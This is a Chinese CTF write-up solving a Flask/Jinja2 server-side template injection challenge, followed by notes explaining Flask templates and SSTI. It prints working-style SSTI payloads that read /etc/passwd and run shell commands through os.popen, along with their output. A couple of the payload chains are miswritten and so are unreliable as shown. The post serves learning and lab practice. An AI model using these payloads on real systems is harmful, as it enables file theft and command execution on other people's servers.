---
layout: post
title: Web进阶题-Web_python_template_injection
excerpt: "攻防世界进阶Web题目-Web_python_template_injection"
date:   2020-10-11 18:29:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问网站，网页正文为"python template injection"

2. 使用Wappalyzer Chrome扩展看出它使用了Flask框架，简单了解一下Flask框架的使用方法

3. 使用Burp Suite发起POST请求，服务器返回405，所以是通过GET方法传的参数，但是参数名网站一点信息都没有

4. 访问ip:port/\{\{"".\_\_class\_\_.\_\_bases\_\_\}\}，返回内容为/(\<type 'basestring'\>,)not found，并没有找到Object类

5. 访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_\}\}，返回内容为/(\<type 'str'\>, \<type 'basestring'\>, \<type 'object'\>) not found，找到了Object类，立刻通过它查找可用类

6. 访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()\}\}，共299个子类，其中第40号type(第41个)指向file类

   ```text
   /[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>.....................] not found
   ```

7. 访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[40].("/etc/passwd").read()\}\}，返回如下内容，可以看出目前可以正常读取文件，但是flag在什么位置仍未可知

   ```shell
   root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false 0:x:0:0:noone:/tmp:/sbin/nologin
   ```

8. 发现能通过warnings.catch_warnings的linecache函数引用了os函数，可以访问os模块执行系统命令。访问ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_line\_\_.os.popen('ls').read()\}\}，返回内容为/fl4g index.py not found,找到flag文件

9. 直接通过网址访问ip:port/fl4g，访问失败

10. 继续使用linecache函数进行调用系统函数，ip:port/\{\{"".\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59].\_\_line\_\_.os.popen('cat fl4g').read()\}\}，返回内容为/ctf\{f22b6844-5169-4054-b2a0-d95b9361cb57\} not found

11. 发现flag，ctf\{f22b6844-5169-4054-b2a0-d95b9361cb57\}

12. 提交，答案正确

## 独立思考

### 1. Flask框架是什么？有什么特点？

Flask是一个微型的Python开发的Web框架，基于Werkzeug WSGI工具箱和Jinja2模板引擎。

```python
from flask import Flask

app=Flask(__name__)

@app.route('/')
def hello_world():
    return 'hello world'

if __name__=='__main__':
    app.run(debug=True)
```

* Flask被称为"微框架"，因为它使用了简单的核心，用extension增加其他的功能。
* Flask没有默认使用的数据库、窗体验证工具，不过可以使用Flask-extension加入这些功能

### 2. Flask的模板是什么？

Flask的渲染方法有两种：

* render_template()用来渲染一个指定的文件

  ```python
  return render_template('index.html')
  ```

* render_template_string()用来渲染一个字符串

  ```python
  html = '<h1> hello world </h1>'
  return render_template_string(html)
  ```

模板并不是单纯的html代码，而是加载着模板语法的html文件。Flask采用Jinja2作为渲染引擎，{{}}在Jinja2中作为变量包裹标识符。类似于Github Pages的生成方法，页面是需要变化的，所以存在一些模板的占位符。

模板默认是在网站根目录下新建templates文件夹，文件夹内存放html模板文件。(模板文件位置可以通过配置文件修改)

* Flask启动文件，go.py

  ```python
  from flask import Flask,render_template
  
  app=Flask(__name__)
  
  @app.route('/')
  def hello_world():
      return render_template('index.html',content='Hello Index')
  
  if __name__=='__main__':
      app.run(debug=True)
  ```
  
* 模板文件，/template/index.html

  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Title</title>
  </head>
  <body>
      <h1>{{content}}</h1>
  </body>
  </html>
  ```

* 访问结果，网页内容出现"Hello index"

### 3. 什么是SSTI？

SSTI(Server-Side Template Injection)服务端模板注入，主要是python、PHP、Java的一些框架，在程序员使用渲染函数时，由于代码不规范或信任了用户的输入而导致造成模板可控。模板渲染本身没有漏洞。

CTF中常见的SSTI漏洞代码常见如下：

```python
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div> 
    ''' %(request.url)
```

这段代码中的request.url是可控的，在CTF中常见的手段就是通过写这个变量，使之报404，因为在渲染时会爆出这个链接，并会说这个地址不存在，如果在这个链接内，拼接一些python代码，就可以在404页返回结果

| 魔术               | 含义           | 注意                                      |
| ------------------ | -------------- | ----------------------------------------- |
| \_\_class\_\_      | 当前对象的类名 | 在ctf中通常用空字符串作为起始             |
| \_\_bases\_\_      | 当前类的基类   | 在ctf中一般通过bases魔术找到Object类      |
| \_\_subclasses\_\_ | 当前类的子类   | 在找到Object类后，查找可以利用的子类      |
| \_\_mro\_\_        | 方法调用顺序   | 在bases()找不到可用对象时，可以通过这个找 |
| \_\_init\_\_       | 实例化对象     | 用于将找到的可利用的class实例化           |

## 产生过的疑问

1. Flask框架是什么？有什么特点？
2. Flask的模板是什么？
3. 什么是SSTI？

